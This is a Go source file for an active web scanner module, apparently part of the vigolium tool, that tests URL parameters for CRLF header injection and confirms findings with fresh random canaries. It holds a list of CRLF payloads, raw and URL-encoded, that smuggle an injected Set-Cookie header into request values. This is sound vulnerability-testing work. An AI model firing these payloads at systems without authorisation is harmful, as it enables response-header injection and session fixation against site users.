package crlf_injection

import (
	"fmt"
	"regexp"
	"strings"

	"github.com/pkg/errors"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/vigolium/vigolium/pkg/utils"
)

type Module struct {
	modkit.BaseActiveModule
	randomStr           string
	payloads            []string
	patternCookieTamper *regexp.Regexp
	rhm                 dedup.Lazy[dedup.RequestHashManager]
}

// buildCRLFPayloads returns the CRLF payload set carrying the given cookie value
// (e.g. "Tamper=<canary>"). The index of each payload is stable, so a successful
// technique can be replayed verbatim with a fresh canary during re-confirmation.
func buildCRLFPayloads(cookieVal string) []string {
	return []string{
		"Set-cookie: " + cookieVal,
		"any\r\nSet-cookie: " + cookieVal,
		"any?\r\nSet-cookie: " + cookieVal,
		"any\nSet-cookie: " + cookieVal,
		"any?\nSet-cookie: " + cookieVal,
		"any\r\nSet-cookie: " + cookieVal + "\r\n",
		"any?\r\nSet-cookie: " + cookieVal + "\r\n",
		"%0d%0aSet-cookie: " + cookieVal,
		"%0D%0ASet-cookie: " + cookieVal,
		"%250d%250aSet-cookie: " + cookieVal,
	}
}

func New() *Module {
	randomStr := "Tamper=" + utils.RandomString(12)
	payloads := buildCRLFPayloads(randomStr)

	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeInsertionPoint,
			modkit.URLParamTypes, // CRLF typically targets URL params
		),
		randomStr:           randomStr,
		payloads:            payloads,
		patternCookieTamper: regexp.MustCompile("(?mi)\\nSet-cookie: " + randomStr),
		rhm:                 dedup.LazyDefaultRHM("crlf_injection"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// ScanPerInsertionPoint tests a single insertion point for CRLF injection.
func (m *Module) ScanPerInsertionPoint(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	// Check if we should scan this insertion point
	rhm := m.rhm.Get(scanCtx.DedupMgr())
	if rhm != nil {
		paramName := ip.Name()
		paramType := fmt.Sprintf("%d", ip.Type())
		if !rhm.ShouldCheckInsertionPoint(urlx, ctx.Request(), paramName, ip.BaseValue(), paramType) {
			return nil, nil
		}
	}

	var results []*output.ResultEvent

	for i, payload := range m.payloads {
		// Append payload to original value
		fullPayload := ip.BaseValue() + payload

		// Build fuzzed request with payload
		fuzzedRaw := ip.BuildRequest([]byte(fullPayload))

		// BuildRequest produces well-formed raw, so wrap directly instead of
		// re-parsing on this hot path.
		fuzzedReq := httpmsg.NewRequestResponseRaw(fuzzedRaw, ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}

		matches := m.patternCookieTamper.FindStringSubmatch(resp.Headers().String())
		// Capture the actual response that carries the injected Set-Cookie header
		// so the finding proves itself. The executor no longer backfills a
		// baseline response for a mutated request, so a module that has the real
		// proving response must set it (otherwise the finding carries none).
		provingResp := ""
		if matches != nil {
			provingResp = resp.FullResponseString()
		}
		resp.Close()
		if matches == nil {
			continue
		}

		// Re-confirm before reporting: replay the SAME technique with fresh
		// random cookie values across multiple rounds. A real CRLF injection
		// reflects an attacker-controlled Set-Cookie header every round; a
		// coincidental pattern (or a server that ignores the payload) will not
		// track the changing canary. Drops the candidate if it can't be
		// reproduced with a controllable value.
		confirmed, cerr := m.confirmCRLF(ctx, ip, httpClient, i)
		if cerr != nil {
			if errors.Is(cerr, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}
		if !confirmed {
			continue
		}

		results = append(results, &output.ResultEvent{
			URL:              urlx.String(),
			Request:          string(fuzzedRaw),
			Response:         provingResp,
			FuzzingParameter: ip.Name(),
			ExtractedResults: []string{payload},
			Info: output.Info{
				Description: fmt.Sprintf("CRLF header injection confirmed: %q reflected as an injected response header across multiple fresh-canary rounds", matches),
			},
		})
		return results, nil
	}

	return results, nil
}

// confirmCRLF replays the CRLF technique at index techniqueIdx with a fresh
// random cookie value per round (via modkit.ConfirmReflection), requiring the
// injected Set-Cookie header to reflect the controllable canary every round.
func (m *Module) confirmCRLF(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
	techniqueIdx int,
) (bool, error) {
	return modkit.ConfirmReflection(2, func(canary string) (bool, error) {
		cookieVal := "Tamper=" + canary
		payload := buildCRLFPayloads(cookieVal)[techniqueIdx]
		fuzzedRaw := ip.BuildRequest([]byte(ip.BaseValue() + payload))

		// BuildRequest produces well-formed raw, so wrap directly instead of
		// re-parsing on this hot path.
		fuzzedReq := httpmsg.NewRequestResponseRaw(fuzzedRaw, ctx.Service())

		resp, _, rerr := httpClient.Execute(fuzzedReq, http.Options{})
		if rerr != nil {
			return false, rerr
		}
		headers := resp.Headers().String()
		resp.Close()

		// The fresh canary must appear as an injected Set-Cookie header line.
		// A case-insensitive substring check on a newline-prefixed marker is
		// equivalent to the launch-time regex without compiling one per round.
		return strings.Contains(strings.ToLower(headers), "\nset-cookie: "+strings.ToLower(cookieVal)), nil
	})
}
